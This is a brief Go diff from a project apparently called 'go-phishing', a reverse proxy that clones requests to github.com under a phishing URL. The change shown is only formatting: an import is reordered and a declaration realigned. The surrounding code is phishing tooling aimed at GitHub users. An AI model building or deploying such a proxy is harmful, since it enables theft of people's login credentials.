@@ -2,20 +2,20 @@ package main
 
 import (
 	"bytes"
+	"flag"
 	"fmt"
 	"go-phishing/db"
 	"io/ioutil"
 	"net/http"
 	"regexp"
 	"strings"
-	"flag"
 )
 
 const upstreamURL = "https://github.com"
 
 var (
 	phishURL string
-	port string
+	port     string
 )
 
 func cloneRequest(r *http.Request) *http.Request {
